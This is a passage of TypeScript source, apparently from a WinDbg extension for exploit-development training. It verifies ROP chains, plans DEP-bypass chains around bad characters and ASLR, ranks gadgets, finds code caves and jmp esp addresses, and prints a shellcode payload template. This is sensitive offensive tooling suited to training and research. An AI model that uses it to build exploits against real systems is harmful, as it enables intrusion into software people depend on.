        out.error(`Frame check FAILED: ${fc.detail}`);
      }
    }

    for (const a of report.static.assumptions) {
      out.info(`  Assumption: ${a}`);
    }

    // Runtime trace
    out.section("Runtime Trace");
    if (!report.runtime.available) {
      out.warn(report.runtime.reason ?? "Runtime trace unavailable");
    } else {
      // DWORD-by-DWORD trace table
      out.info("ESP+Off  | DWORD      | Action                                           | Side Effects");
      out.info("---------|------------|--------------------------------------------------|---------------------------");
      for (const t of report.runtime.trace) {
        const espCol = `ESP+${t.espOffset.toString(16).padStart(4, "0").toUpperCase()}`;
        const effects = t.sideEffects.length > 0 ? t.sideEffects.join("; ") : "";
        out.info(`${espCol.padEnd(9)}| ${t.dwordHex.padEnd(11)}| ${t.action.substring(0, 49).padEnd(49)}| ${effects}`);
        for (const note of t.notes) {
          out.info(`         |            |   ${note}`);
        }
      }

      // Register state at end
      out.section("Final Register State");
      const regs = report.runtime.finalRegisters;
      const regOrder = ["eax", "ebx", "ecx", "edx", "esi", "edi", "ebp", "esp"];
      for (const reg of regOrder) {
        if (regs[reg] !== undefined && regs[reg] !== "?") {
          out.info(`  ${reg.toUpperCase()} = ${regs[reg]}`);
        }
      }

      // Register clobber warnings
      if (report.runtime.registerClobbers.length > 0) {
        out.section("Register Clobber Warnings");
        for (const c of report.runtime.registerClobbers) {
          out.warn(`  ${c}`);
        }
      }

      for (const a of report.runtime.assumptions) {
        out.info(`  Assumption: ${a}`);
      }
    }

    // Summary row — three-state: PASS (all checks ran and passed),
    // INCOMPLETE (checks clean but frame not validated), FAIL (a check failed)
    const hasNotChecked = report.static.frameCheck?.status === "not_checked";
    const staticStatus = !report.static.valid ? "FAIL"
      : hasNotChecked ? "INCOMPLETE"
      : "PASS";
    const runtimeStatus = report.runtime.available
      ? (report.runtime.registerClobbers.length > 0 ? "WARN" : "OK")
      : "N/A";

    const rows = [{
      Source: sourceLabel,
      DWORDs: String(report.static.dwordCount),
      Stack: `${report.static.totalStackBytes} bytes`,
      Badchars: report.static.badcharHits.length > 0
        ? `${report.static.badcharHits.length} VIOLATION(S)`
        : badchars.length > 0 ? "clean" : "not checked",
      Placeholders: String(report.static.unresolvedPlaceholders.length),
      Static: staticStatus,
      Runtime: runtimeStatus,
    }];
    renderRows("Chain Verifier", rows);
    setResult({
      command: "rop.verify",
      args: options,
      success: report.static.valid && !hasNotChecked,
      findings: [report],
      warnings: report.static.badcharHits.map(h => `Badchar 0x${h.byte.toString(16).padStart(2, "0")} in ${h.dwordHex} at step ${h.stepIndex}`),
      errors: [],
    });
    return toDxResult("Chain Verifier", rows);
  };

  // dep_plan decides three layers from evidence the debugger holds: the modules gadgets can come from,
  // the API and where its address comes from, and the style the corpus supports. Each layer either has
  // an answer or is the one line the run ends on.
  const shortName = (name: string): string => name.split("\\").pop() ?? name;
  // The loaded module a name he typed resolves to, as the module list shows it.
  const moduleLabel = (name: string): string => shortName(moduleInfoByName(name)?.name ?? name);
  const byteList = (bytes: number[]): string => bytes.map((byte) => byte.toString(16).toUpperCase().padStart(2, "0")).join(" ");
  const sameModule = (left: string, right: string): boolean => {
    const norm = (name: string): string => shortName(name).toLowerCase().replace(/\.(dll|exe)$/, "");
    return norm(left) === norm(right);
  };

  // The bytes every address in the module shares. A bad one among them rules out every gadget in it.
  const sharedBadBytes = (info: { base: bigint; size: bigint }, badSet: Set<number>): number[] => {
    const first = Number(info.base);
    const last = Number(info.base + info.size - BigInt(1));
    const shared = [24, 16].filter((shift) => ((first >>> shift) & 0xff) === ((last >>> shift) & 0xff)).map((shift) => (first >>> shift) & 0xff);
    return shared.filter((byte, i) => badSet.has(byte) && shared.indexOf(byte) === i);
  };

  // Every loaded module, and the reason it cannot give gadgets if it cannot.
  const gadgetModules = (badSet: Set<number>) => listModulesWithMitigations().map((info) => {
    const bad = sharedBadBytes(info, badSet);
    const why = info.aslr === "enabled" ? "ASLR"
      : info.aslr !== "disabled" ? "its PE header is unreadable"
      : bad.length > 0 ? `every address holds the bad byte(s) ${byteList(bad)}` : undefined;
    return { info, label: shortName(info.name), why };
  });

  const IFEO = "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options";
  // Exploit Protection keeps a program's DEP setting in its IFEO key, and the process itself cannot be
  // asked from here. The debugger runs on the target in every OSED setup, so its registry is the target's.
  const perProgramDep = (exe: string): boolean | undefined => {
    let text = "";
    try {
      text = executeDebuggerCommand(`.shell -ci "x" reg query "${IFEO}\\${exe}" /s /v MitigationOptions`).join("\n");
    } catch (_error) {
      return undefined;
    }
    const value = /MitigationOptions\s+REG_BINARY\s+([0-9A-F]{2})/i.exec(text);
    if (value) return (parseInt(value[1], 16) & 0x1) !== 0;
    return /unable to find/i.test(text) ? false : undefined;
  };

  // Rows of sc.iat_find for exactly this symbol, without printing them.
  const slotsOf = (symbol: string): Array<{ owner: string; slot: number; fixed: boolean }> => {
    const rows = out.quietly(() => ((api.sc as { iat_find: (name: string) => unknown }).iat_find(symbol) as { rows?: { length: number; [i: number]: Record<string, string> } }).rows);
    return Array.from({ length: rows?.length ?? 0 }, (_, i) => rows![i])
      .filter((row) => new RegExp(`(^|!)${symbol}$`, "i").test(out.stripDml(String(row.Symbol ?? "")).trim()))
      .map((row) => {
        const owner = out.stripDml(String(row.Owner ?? ""));
        const match = /0x([0-9a-fA-F]+)/.exec(out.stripDml(String(row.Slot ?? "")));
        return { owner, slot: match ? parseInt(match[1], 16) >>> 0 : 0, fixed: moduleInfoByName(owner)?.aslr === "disabled" };
      })
      .filter((row) => row.slot !== 0);
  };

  const depVerdict = () => {
    const policyByte = tryReadMemory(BigInt(NX_POLICY_ADDRESS), 1);
    const policy = policyByte ? NX_POLICIES[policyByte[0] & 0x3] : undefined;
    const exe = listModulesWithMitigations().find((info) => info.name.toLowerCase().endsWith(".exe"));
    const name = exe ? shortName(exe.name) : "the process";
    const nx = exe?.nxcompat === "enabled";
    const needsMore = policy === "OptIn" && exe !== undefined && !nx;
    const forced = needsMore ? perProgramDep(name) : false;
    const optIn = needsMore && forced === false ? slotsOf("SetProcessDEPPolicy").map((row) => shortName(row.owner)) : [];
    return { name, ...depState(policy, exe ? { name, nx, forced } : undefined, optIn) };
  };

  // How the chain gets the API's address: its own slot in a module that does not move, else the slot of
  // another export of the same DLL plus the distance between the two, which sc.api_plan measures live.
  // Only a slot in a module without ASLR can anchor that distance: a slot that moves needs a leak itself.
  type Anchor = { why: string; others: string[] };
  type Route = { api: DepApi; owner: string; slot: number; delta?: Delta & Anchor & { anchorAt: number; apiAt: number } };
  const directRoute = (depApi: DepApi, modules: string[]): Route | undefined => {
    const rows = slotsOf(depApi).filter((row) => row.fixed);
    const own = rows.find((row) => modules.some((module) => sameModule(row.owner, module))) ?? rows[0];
    return own ? { api: depApi, owner: own.owner, slot: own.slot } : undefined;
  };
  const routeFor = (depApi: DepApi, modules: string[], badchars: number[], fixed: string[]): Route | undefined => {
    const own = directRoute(depApi, modules);
    if (own || fixed.length === 0) return own;
    for (const dll of ["kernel32", "kernelbase"]) {
      const anchors = sc.api_plan(`${dll}!${depApi}`, badchars, fixed).candidates.filter((candidate) => candidate.strategy === "derived-address" && candidate.anchor);
      const inGadgets = (candidate: typeof anchors[number]): boolean => modules.some((module) => sameModule(candidate.ownerModule, module));
      const anchor = anchors.find((candidate) => candidate.slotPayloadSafe && inGadgets(candidate)) ?? anchors.find((candidate) => candidate.slotPayloadSafe)
        ?? anchors.find(inGadgets) ?? anchors[0];
      if (anchor && anchor.anchor) {
        const why = anchors.length === 1 ? "only"
          : anchor.slotPayloadSafe ? "its slot address has no bad byte, so the chain can pop it as it is"
          : inGadgets(anchor) ? `none is free of bad bytes, and this one is in ${shortName(anchor.ownerModule)}, where the gadgets come from`
          : "none is free of bad bytes, and none is in a module the gadgets come from, so this is the lowest slot";
        return {
          api: depApi, owner: anchor.ownerModule, slot: Number(anchor.slot) >>> 0,
          delta: {
            dll, anchor: anchor.anchor.symbol, value: Number(anchor.anchor.delta) >>> 0, anchorAt: Number(anchor.pointer) >>> 0, apiAt: Number(anchor.target.address) >>> 0,
            why, others: anchors.filter((candidate) => candidate !== anchor).map((candidate) => shortName(candidate.ownerModule)),
          },
        };
      }
    }
    return undefined;
  };

  // The two addresses a frame needs that only the module can give: a writable dword for an out-parameter
  // and an executable cave for WriteProcessMemory's copy. dep_plan and dep_candidates both weigh their
  // write gadget against the frame, so both have to see the same two, or the command [4/7] prints as the
  // one that reproduces it would reproduce something else.
  const frameAddresses = (modules: string[], badText: string, depApi: DepApi, moduleFailed = false): { writable?: number; cave?: number } => {
    const pickCave = (minSize: number, capability: string): number | undefined => {
      for (const module of modules) {
        const { caves } = findCodeCaves(module, minSize, 25, badText, capability);
        const found = caves.find((candidate) => candidate.addrSafe !== false || candidate.safeVa !== null);
        if (found) return Number(found.addrSafe === false && found.safeVa !== null ? found.safeVa : found.address);
      }
      return undefined;
    };
    return {
      writable: depApi === "VirtualAlloc" || moduleFailed ? undefined : out.quietly(() => pickCave(4, "STAGING")),
      cave: depApi === "WriteProcessMemory" && !moduleFailed ? out.quietly(() => pickCave(0x210, "EXEC")) : undefined,
    };
  };

  // Searching a module for a set of encodings reads every byte once, so a job or a shape no scan filled
  // is settled here before anything says it is absent. Each group is the encodings of one job or shape;
  // its result is the clean addresses that hold one and how many hits sat at an address holding a bad
  // byte. The corpus comes back with every clean hit the scan had missed.
  type Search = { corpus: CapabilityIndex | undefined; groups: Array<{ clean: number[]; dirty: number }> };
  const searchEncodings = (scanned: CapabilityIndex | undefined, modules: string[], groups: number[][][], badchars: number[]): Search => {
    const encodings: number[][] = [];
    const owners = groups.map((group) => group.map((encoding) => encodings.push(encoding) - 1));
    const clean = badcharAddressFilter(badchars, 4);
    const known = new Set((scanned?.gadgets ?? []).map((gadget) => depPlanAddress(gadget)));
    const hits: Array<{ mnemonic: string; address: bigint; module: string }> = [];
    const found: Array<{ encoding: number; address: number }> = [];
    const dirty = encodings.map(() => 0);
    for (const module of modules) {
      const search = findEncodings(module, encodings, (address) => clean.predicate({ address }), 8);
      search.dirty.forEach((count, i) => { dirty[i] += count; });
      for (const hit of search.hits) {
        found.push({ encoding: hit.encoding, address: Number(hit.address) });
        if (!known.has(Number(hit.address))) hits.push({ mnemonic: hit.mnemonic, address: hit.address, module });
      }
    }
    const corpus = hits.length > 0
      ? mergeCapabilityIndexes([...(scanned ? [scanned] : []), buildCapabilityIndexFromSequences(sequencesFromLiveHits(hits))])
      : scanned;
    return {
      corpus,
      groups: owners.map((mine) => ({
        clean: found.filter((hit) => mine.indexOf(hit.encoding) >= 0).map((hit) => hit.address),
        dirty: mine.reduce((sum, index) => sum + dirty[index], 0),
      })),
    };
  };

  type Solved = { corpus: CapabilityIndex | undefined; plans: Record<DepPlanStyle, JobPlan[]>; settled: Record<string, Settled>; tried: WriteTrial[] };
  const solveStyles = (scanned: CapabilityIndex | undefined, modules: string[], badchars: number[], exclude: number[], depApi?: DepApi, facts: FrameFacts = {}): Solved => {
    const api = depApi ?? "VirtualAlloc";
    // The skeleton's write gadget fixes which register every value is loaded into and which is held, so
    // it is weighed against the frame it has to fill rather than taken from the ranking alone.
    const planBoth = (index: CapabilityIndex | undefined) => {
      const skeleton = planSkeleton(index, exclude, api, facts, badchars);
      return { plans: { skeleton: skeleton.plans, pushad: planJobs(index, "pushad", exclude, depApi) }, tried: skeleton.tried };
    };
    let both = planBoth(scanned);
    const open: Job[] = [];
    for (const plan of [...both.plans.skeleton, ...both.plans.pushad]) if (!plan.pick && open.every((job) => job.key !== plan.job.key)) open.push(plan.job);
    if (open.length === 0 || modules.length === 0) return { corpus: scanned, ...both, settled: {} };
    const groups = open.map((job) => encodingsFor(job));
    const search = searchEncodings(scanned, modules, groups, badchars);
    if (search.corpus !== scanned) both = planBoth(search.corpus);
    const settled: Record<string, Settled> = {};
    open.forEach((job, i) => {
      settled[job.key] = { modules: modules.map(moduleLabel).join(", "), encodings: groups[i].length, ...search.groups[i] };
    });
    return { corpus: search.corpus, ...both, settled };
  };

  const otherStyle = (style: DepPlanStyle): DepPlanStyle => (style === "pushad" ? "skeleton" : "pushad");
  // A job the other style has no counterpart for: no job of it asks for the same capability and register.
  // The API decides which jobs a style has at all, so it decides this too.
  const neededBy = (job: Job, style: DepPlanStyle, api: DepApi): boolean => jobsFor(style, api).some((other) =>
    other.capabilities.some((kind) => job.capabilities.indexOf(kind) >= 0) && (other.register === undefined || other.register === job.register));
  const WHY_NOT_NEEDED: Record<string, string> = { capture: ": pushad pushes ESP itself" };
  const titles = (plans: JobPlan[]): string => plans.map((plan) => plan.job.title).join(", ");

  // The style the corpus supports: one with a gadget for every job, the skeleton first when both have.
  const chooseStyle = (solved: Solved): DepPlanStyle => {
    const missing = (style: DepPlanStyle): number => solved.plans[style].filter((plan) => !met(plan)).length;
    return missing("skeleton") <= missing("pushad") ? "skeleton" : "pushad";
  };

  // The body of dep_plan's [4/7] and all of dep_candidates, so pasting the echoed line repeats the section.
  const printDepCandidates = (solved: Solved, modules: string[], badSet: Set<number>, style: DepPlanStyle, api: DepApi, exclude: number[] = []) => {
    out.info("Ranked by fewest side effects, then the smallest stack move. The pick (>) is the first that keeps every register the chain still needs.");
    const plans = solved.plans[style];
    for (const plan of plans) {
      const settled = solved.settled[plan.job.key];
      const lines = planLines(plan);
      if (settled && plan.verdicts.length === 0 && !plan.path) lines[0] = `  ${plan.job.title}: none in ${settled.modules}`;
      for (const line of lines) out.print(line);
      if (settled) for (const line of settledLines(plan, settled, exclude)) out.print(line);
    }
    let jmpEsp: number | undefined;
    if (style === "pushad") {
      for (const [label, bytes] of [["jmp esp", "FF E4"], ["call esp", "FF D4"]]) {
        const hits: number[] = [];
        for (const module of modules) {
          out.echo("find_bytes", [module, bytes, 20]);
          invoke("find_bytes", [module, bytes, 20]);
          hits.push(...((lastResult?.findings ?? []) as unknown[])
            .map((hit) => Number(hit))
            .filter((hit) => Number.isFinite(hit) && addressBadBytes(BigInt(hit), 4, badSet).length === 0));
        }
        out.print(`  ${label}: ${hits.length > 0 ? hits.slice(0, 3).map(dwordHex).join("  ") : "none without bad bytes"}`);
        jmpEsp = jmpEsp ?? hits[0];
      }
    }
    // Which write gadget was weighed and what the frame could be filled with through each: the pick above
    // is the ranking's only when the frame agrees, so the frame's answer is shown beside it.
    if (style === "skeleton" && solved.tried.length > 1) {
      for (const trial of solved.tried) {
        out.print(`  ${dwordHex(trial.address)}  ${trial.sequence.padEnd(34)}  value in ${trial.value}, field in ${trial.field || "nowhere"}: ${trial.filled} of ${trial.of} frame values reachable${trial.unmet > 0 ? `, ${trial.unmet} job(s) left open` : ""}`);
      }
    }
    const missing = plans.filter((plan) => !met(plan));
    const where = modules.map(moduleLabel).join(", ");
    if (missing.length > 0) out.warn(`No gadget in ${where} for: ${titles(missing)}. Each was searched for in every byte of it, so this is the module, not the scan.`);
    // The method can be the only thing wrong: name the style that needs none of what is missing here.
    const other = otherStyle(style);
    const blocking = missing.filter((plan) => !neededBy(plan.job, other, api));
    if (blocking.length > 0) {
      const otherMissing = solved.plans[other].filter((plan) => !met(plan));
      out.warn(`${titles(blocking)} block${blocking.length === 1 ? "s" : ""} the ${style} style, and the ${other} style needs no such gadget${blocking.map((plan) => WHY_NOT_NEEDED[plan.job.key] ?? "").join("")}.`);
      out.warn(otherMissing.length === 0
        ? `In ${where} the ${other} style has a gadget for every job: dx @$osed().dep_candidates("${modules.join(",")}", "${byteList([...badSet])}", "${other}", "${api}")`
        : `In ${where} the ${other} style lacks ${titles(otherMissing)}, so it is blocked too.`);
    }
    return { plans, jmpEsp, missing: missing.map((plan) => plan.job.title) };
  };

  // A corpus already in memory serves when it was a complete live scan of these modules for these bad
  // chars: scanning again could only return the same gadgets, and throwing it away cost him his scan.
  const loadedCorpusCovers = (modules: string[], badchars: number[]): boolean => {
    const loaded = corpusModules.map((entry) => entry.name);
    const same = (left: number[], right: number[]): boolean => left.length === right.length && left.every((byte) => right.indexOf(byte) >= 0);
    return currentRopCorpus !== undefined && corpusOrigin === "live" && corpusComplete
      && loaded.length === modules.length && modules.every((module) => loaded.some((name) => sameModule(name, module)))
      && same(corpusBadchars ?? [], badchars) && corpusStaleModules().length === 0;
  };

  const executeDepCandidates = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("dep_candidates");
    }
    const [moduleArg, badArg, styleArg, apiArg] = args;
    const styleText = String(styleArg ?? "skeleton").trim().toLowerCase();
    const depApi = DEP_PLAN_APIS.find((name) => name.toLowerCase() === String(apiArg ?? "VirtualAlloc").trim().toLowerCase());
    const modules = (typeof moduleArg === "string" ? moduleArg : "").split(",").map((name) => name.trim()).filter(Boolean);
    const badText = typeof badArg === "string" ? badArg : "";
    const badchars = parseHexByteList(badText);
    const fail = (message: string): DxResult => {
      const rows = [{ Error: message }];
      renderRows("DEP Candidates", rows);
      out.info("Usage: dx @$osed().dep_candidates(module, badchars, style?, api?)");
      setResult({ command: "dep_candidates", args: { module: moduleArg, badchars: badArg, style: styleArg }, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("DEP Candidates", rows);
    };
    if (styleText !== "auto" && !DEP_PLAN_STYLES.includes(styleText as DepPlanStyle)) return fail(`style must be one of ${DEP_PLAN_STYLES.join(", ")}.`);
    if (!depApi) return fail(`api must be one of ${DEP_PLAN_APIS.join(", ")}: it decides which jobs the chain needs.`);
    if (!Array.isArray(badchars)) return fail('badchars must be hex bytes such as "00 0A 0D".');
    const unknown = modules.length === 0 ? [""] : modules.filter((module) => !moduleInfoByName(module));
    if (unknown.length > 0) return fail(`Module "${unknown[0]}" is not loaded. dx @$osed().modules() lists the loaded modules.`);
    // Its own scan unless his is already in memory, so the loaded corpus stays as the user left it.
    const scanned = loadedCorpusCovers(modules, badchars as number[])
      ? currentRopCorpus
      : mergeCapabilityIndexes(discoverLiveIndexes(modules, { badchars }).indexes);
    const route = routeFor(depApi, modules, badchars as number[], gadgetModules(new Set(badchars as number[])).filter((entry) => entry.info.aslr === "disabled").map((entry) => entry.label));
    const solved = solveStyles(scanned, modules, badchars as number[], [], depApi,
      { iatSlot: route?.slot, delta: route?.delta?.value, ...frameAddresses(modules, badText, depApi) });
    const style = styleText === "auto" ? chooseStyle(solved) : styleText as DepPlanStyle;
    const { plans, missing } = printDepCandidates(solved, modules, new Set(badchars as number[]), style, depApi);
    const rows = plans.map((plan) => ({
      Job: plan.job.title,
      Pick: plan.pick ? dwordHex(depPlanAddress(plan.pick.gadget)) : "none",
      Why: plan.pick ? plan.pick.reason : "no candidate keeps the live registers",
    }));
    setResult({
      command: "dep_candidates",
      args: { module: modules.join(","), badchars: badText, style },
      success: true,
      findings: rows,
      warnings: missing.length > 0 ? [`No candidate for: ${missing.join(", ")}`] : [],
      errors: [],
    });
    return toDxResult("DEP Candidates", rows);
  };

  // A palette of gadgets named by the instruction, for a chain written by hand: SEH, egghunter or DEP.
  const executePalette = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") return helperHelp("palette");
    const [moduleArg, badArg] = args;
    const modules = (typeof moduleArg === "string" ? moduleArg : "").split(",").map((name) => name.trim()).filter(Boolean);
    const badText = typeof badArg === "string" ? badArg : "";
    const badchars = parseHexByteList(badText);
    const fail = (message: string): DxResult => {
      const rows = [{ Error: message }];
      renderRows("Gadget Palette", rows);
      out.info("Usage: dx @$osed().palette(module, badchars)");
      setResult({ command: "palette", args: { module: moduleArg, badchars: badArg }, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("Gadget Palette", rows);
    };
    if (!Array.isArray(badchars)) return fail('badchars must be hex bytes such as "00 0A 0D".');
    const unknown = modules.length === 0 ? [""] : modules.filter((module) => !moduleInfoByName(module));
    if (unknown.length > 0) return fail(`Module "${unknown[0]}" is not loaded. dx @$osed().modules() lists the loaded modules.`);
    out.section(out.dxCall("palette", [modules.join(","), badText]));
    const scanned = loadedCorpusCovers(modules, badchars as number[])
      ? currentRopCorpus
      : mergeCapabilityIndexes(discoverLiveIndexes(modules, { badchars }).indexes);
    const first = PALETTE_SHAPES.map((shape) => pickShape(scanned?.gadgets ?? [], shape));
    const open = PALETTE_SHAPES.filter((_, i) => first[i] === undefined);
    const search = searchEncodings(scanned, modules, open.map(shapeEncodings), badchars as number[]);
    const gadgets = search.corpus?.gadgets ?? [];
    const entries = PALETTE_SHAPES.map((shape, i) => {
      const at = open.indexOf(shape);
      return { shape, pick: first[i] ?? (at >= 0 ? pickShape(gadgets, shape) : undefined), dirty: at >= 0 ? search.groups[at].dirty : 0 };
    });
    const label = modules.map(moduleLabel).join(", ");
    out.info(`Every shape below that no scanned gadget fills was searched for in every byte of ${label}, by its plain encodings, before it is None. Addresses hold none of the bad bytes.`);
    for (const group of PALETTE_GROUPS) {
      const found = entries.filter((entry) => entry.shape.op === group.op && entry.pick).map((entry) => entry.shape.name.slice("GADGET_".length));
      const total = entries.filter((entry) => entry.shape.op === group.op).length;
      out.print(`  ${group.op.padEnd(6)} ${String(found.length).padStart(2)} of ${String(total).padEnd(2)}  ${found.join(" ")}`);
    }
    out.print("");
    out.print(COPY_SEPARATOR);
    for (const line of paletteLines(entries, paletteExtras(gadgets), label)) out.print(line);
    const rows = entries.filter((entry) => entry.pick).map((entry) => ({ Name: entry.shape.name, Address: dwordHex(depPlanAddress(entry.pick!.gadget)), Gadget: gadgetSequence(entry.pick!.gadget) }));
    setResult({
      command: "palette",
      args: { module: modules.join(","), badchars: badText },
      success: true,
      findings: entries.map((entry) => ({ name: entry.shape.name, address: entry.pick ? depPlanAddress(entry.pick.gadget) : null })),
      warnings: [],
      errors: [],
    });
    return toDxResult("Gadget Palette", rows);
  };

  const executeDepPlan = (...args: unknown[]): DxResult => {
    if (args.length === 1 && args[0] === "help") {
      return helperHelp("dep_plan");
    }
    const [apiArg, moduleArg, badArg, styleArg, stageArg, excludeArg, anywayArg] = depPlanArgs(args);
    const apiText = String(apiArg ?? "").trim();
    const autoApi = apiText === "";
    const requestedApi = DEP_PLAN_APIS.find((name) => name.toLowerCase() === apiText.toLowerCase());
    const styleText = styleArg === undefined ? "skeleton" : String(styleArg).trim().toLowerCase() || "auto";
    // The next free payloadN() in his file. dep_plan cannot know how many stages he already has, so the
    // resolved value is echoed below: pasting that line back reproduces the same numbering.
    const stage = stageArg === undefined ? 1 : Math.trunc(Number(stageArg));
    // Addresses the chain must not use. Removing one can change which gadget wins another job and it
    // changes the junk accounting throughout, which is why this re-solves rather than swapping by hand.
    const excludeText = typeof excludeArg === "string" ? excludeArg.trim() : "";
    const exclude = excludeText ? excludeText.split(/[\s,]+/).map((token) => parseInt(token.replace(/^0x/i, ""), 16) >>> 0) : [];
    const anyway = anywayArg === true;
    const moduleText = typeof moduleArg === "string" ? moduleArg.trim() : "";
    const badText = typeof badArg === "string" ? badArg : "";
    const badchars = parseHexByteList(badText);
    const fail = (message: string): DxResult => {
      const rows = [{ Error: message }];
      renderRows("DEP Plan", rows);
      out.info('Usage: dx @$osed().dep_plan(badchars)    or    dx @$osed().dep_plan(api, module, badchars, style?, firstStage?, exclude?, anyway?)');
      setResult({ command: "dep_plan", args: { api: apiArg, module: moduleArg, badchars: badArg, style: styleArg }, success: false, findings: [], warnings: [], errors: [message] });
      return toDxResult("DEP Plan", rows);
    };
    if (!autoApi && !requestedApi) return fail(`api must be one of ${DEP_PLAN_APIS.join(", ")}, or "" to let the tool choose.`);
    if (styleText !== "auto" && !DEP_PLAN_STYLES.includes(styleText as DepPlanStyle)) return fail(`style must be one of ${DEP_PLAN_STYLES.join(", ")}, or "auto".`);
    if (!Number.isFinite(stage) || stage < 1) return fail("firstStage must be the number of the next free payloadN() in your file, 1 or more.");
    if (exclude.some((address) => !Number.isFinite(address) || address === 0)) return fail('exclude must be gadget addresses in hex, such as "6A42F3CD 6A411118".');
    if (!Array.isArray(badchars)) return fail('badchars must be hex bytes such as "00 0A 0D".');
    const named = moduleText.split(",").map((name) => name.trim()).filter(Boolean);
    const missingModule = named.find((name) => !moduleInfoByName(name));
    if (missingModule) return fail(`Module "${missingModule}" is not loaded. dx @$osed().modules() lists the loaded modules.`);
    const badSet = new Set(badchars as number[]);

    // Module layer. Named modules are his; otherwise every module that can give a gadget at all.
    const candidates = gadgetModules(badSet);
    const usable = candidates.filter((entry) => entry.why === undefined);
    // A slot's own address must not move, but its bytes may be bad: [5/7] builds it from clean constants.
    const fixedOwners = candidates.filter((entry) => entry.info.aslr === "disabled").map((entry) => entry.label);
    const chosen = named.length > 0
      ? named.map((name) => candidates.find((entry) => sameModule(entry.info.name, moduleInfoByName(name)!.name))).filter((entry): entry is typeof candidates[number] => entry !== undefined)
      : usable;
    const modules = named.length > 0 ? named : usable.map((entry) => entry.label);
    const modulesArg = modules.join(",");
    const modulesLabel = chosen.map((entry) => entry.label).join(", ") || "no module";

    // API layer, resolved before the header so the echoed call names what this run used.
    const routes = (autoApi ? DEP_PLAN_APIS : [requestedApi as DepApi]).map((name) => routeFor(name, modules, badchars as number[], fixedOwners));
    const route = routes.find((candidate) => candidate !== undefined && !candidate.delta) ?? routes.find((candidate) => candidate !== undefined);
    const depApi: DepApi = route?.api ?? requestedApi ?? "VirtualAlloc";
    const callArgs = (styleValue: string, force: boolean): unknown[] => [
      autoApi && !route ? "" : depApi, modulesArg, badText, styleValue, stage,
      ...(excludeText || force ? [excludeText] : []), ...(force ? [true] : []),
    ];

    out.section(out.dxCall("dep_plan", callArgs(styleText, anyway)));
    const n = DEP_PLAN_SECTIONS;
    const summary: Array<Record<string, string>> = [];
    // Below each section's output, so a screenshot of the output stops here and the block below it is one
    // drag to select. It is a Python comment, so dragging the line itself in costs nothing.
    const SEPARATOR = COPY_SEPARATOR;
    const printBlock = (block: Block) => {
      out.print("");
      if ("none" in block) {
        out.info(`Nothing to copy here: ${block.none}`);
        return;
      }
      out.print(SEPARATOR);
      for (const line of block.lines) out.print(line);
    };

    // Whether a chain is needed at all comes first: without DEP the stack runs the shellcode as it is.
    const dep = depVerdict();
    if (dep.enforced === false) {
      out.section(`DEP is OFF for ${dep.name}: no chain needed`);
      out.error(`The stack executes: ${dep.why}.`);
      const jumps: number[] = [];
      for (const module of modules) {
        out.echo("find_bytes", [module, "FF E4", 20, badText]);
        invoke("find_bytes", [module, "FF E4", 20, badText]);
        jumps.push(...((lastResult?.findings ?? []) as unknown[]).map((hit) => Number(hit)).filter((hit) => Number.isFinite(hit)));
      }
      out.error(jumps.length > 0
        ? `Jump straight to your shellcode: payload = b"A" * OFFSET + p32(${dwordHex(jumps[0])}) + b"\\x90" * 16 + shellcode    (${dwordHex(jumps[0])} is jmp esp, no bad byte)`
        : `No jmp esp without a bad byte in ${modulesLabel}. dx @$osed().find_bytes("", "FF E4", 20, "${badText}") searches every module.`);
      if (!anyway) {
        out.error(`The chain sections are skipped: they solve a problem this process does not have. To build the chain anyway, as an exercise: ${out.dxCall("dep_plan", callArgs(styleText, true))}`);
        setResult({ command: "dep_plan", args: { badchars: badText }, success: true, findings: [{ dep: "off", why: dep.why, jmpEsp: jumps[0] }], warnings: [], errors: [] });
        return toDxResult("DEP Plan", [{ Section: "DEP", Result: `off: ${dep.why}` }]);
      }
    } else if (dep.enforced === true) {
      out.section(`DEP is on for ${dep.name}`);
      out.info(`${dep.why[0].toUpperCase()}${dep.why.slice(1)}. The stack does not execute, so the shellcode needs the chain below.`);
    } else {
      out.section(`DEP for ${dep.name}: unknown`);
      out.warn(`Assumed on: ${dep.why}.`);
    }
    summary.push({ Section: "DEP", Result: dep.enforced === undefined ? "unknown, assumed on" : dep.enforced ? "on" : "off, built anyway" });

    // What stops a chain. [1/7] to [4/7] stay true without it, because they describe the module and its
    // gadgets. [5/7] to [7/7] would describe a call he cannot make, so they print one line instead of
    // content: an answer-shaped section is worse than no section.
    type Layer = "module" | "API" | "method";
    let blocker: { layer: Layer; what: string; next: string[] } | undefined;
    const stop = (layer: Layer, what: string, ...next: string[]): void => {
      if (blocker) return;
      blocker = { layer, what, next };
      out.section(`STOP: no ${depApi} chain from ${modulesLabel}`);
      out.error(`The ${layer} layer fails: ${what}`);
      for (const line of next) out.error(line);
    };
    // The one piece a target with nothing fixed is missing is an address, and only the target can send it.
    const leakNext = (): string[] => [
      "The missing piece is a leak: one pointer the target sends back, minus its RVA, is the base of a module with ASLR.",
      "Start at the crash: dx @$osed().leak.scan(@esp, 0x400) lists the pointers on the stack, each with its module and RVA.",
      "When the target sends one back: dx @$osed().leak.base(<pointer>, <rva>) gives the base, and each gadget is base + RVA.",
    ];
    const usableNext = (): string[] => usable.length > 0
      ? [`Next: dx @$osed().dep_plan(${JSON.stringify(badText)})    builds from the modules that can give gadgets: ${usable.map((entry) => entry.label).join(", ")}.`]
      : [];

    out.section(`[1/${n}] Module protections for ${modulesLabel}`);
    out.echo("modules", named.length === 1 ? [named[0]] : []);
    invoke("modules", named.length === 1 ? [named[0]] : []);
    const moduleWarnings: string[] = [];
    for (const entry of chosen) {
      const info = entry.info;
      const first = Number(info.base);
      const last = Number(info.base + info.size - BigInt(1));
      const bad = sharedBadBytes(info, badSet);
      const warnings = [
        info.aslr === "enabled" ? `${entry.label} has ASLR: its addresses change on every run, so a chain built from it needs a leak.` : undefined,
        info.preferredBase !== BigInt(0) && info.base !== info.preferredBase ? `${entry.label} is loaded at ${dwordHex(first)}, not at its preferred base ${dwordHex(Number(info.preferredBase))}. Without ASLR it stays there for this boot, but every address below is this process's: never take one from the file on disk.` : undefined,
        bad.length > 0 ? `Every address in ${entry.label} (${dwordHex(first)} to ${dwordHex(last)}) holds the bad byte(s) ${byteList(bad)}, so no gadget from it is usable.` : undefined,
      ].filter((warning): warning is string => warning !== undefined);
      for (const warning of warnings) out.warn(warning);
